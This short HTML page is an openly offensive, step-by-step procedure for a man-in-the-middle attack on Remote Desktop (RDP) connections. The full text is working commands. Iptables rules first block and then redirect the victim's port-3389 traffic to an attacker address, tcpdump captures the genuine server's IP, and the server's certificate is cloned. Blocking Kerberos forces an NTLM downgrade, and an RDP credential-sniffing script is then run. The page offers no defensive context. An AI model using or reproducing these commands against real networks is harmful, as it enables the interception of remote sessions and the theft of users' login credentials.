<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Performing MitM RDP</title>
</head><body>1. Create an iptables rule that rejects SYN packets from victim intended for an RDP server. If we don't reject, victim would establish a connection with the genuine host and not us<br/>
# iptables -A FORWARD -p tcp -s "$VICTIM_IP" --syn --dport 3389 -j REJECT<br/>
<br/>
2. Wait for TCP SYN with dest 3389 to learn address of original host<br/>
# tcpdump -n -c 1 -i "$IFACE" src host "$VICTIM_IP" and "tcp[tcpflags] &amp; tcp-syn != 0" and dst port 3389 2&gt;/dev/null | sed -e 's/.*&gt; \([0-9.]*\)\.3389:.*/\1/'<br/>
<br/>
3. Retrieve SSL certificate of RDP server and create new self-signed cert with same common name. <br/>
4. Now, remove iptables rule and redirect ALL TCP traffic coming from victim destined to the RDP host to our IP address:<br/>
# iptables -F<br/>
# iptables -t nat -A PREROUTING -p tcp -d "$ORIGINAL_DEST" -s "$VICTIM_IP" --dport 3389 -j DNAT --to-destination "$ATTACKER_IP"<br/>
<br/>
5. Force downgrade from Kerberos to NTLM by blocking Kerberos traffic<br/>
# iptables -A INPUT -p tcp -s "$VICTIM_IP" --dport 88 -j REJECT --reject-with tcp-reset<br/>
<br/>
6. Run the script<br/>
# rdp-cred-sniffer.py -c "$CERTPATH" -k "$KEYPATH" "$ORIGINAL_DEST"</body></html>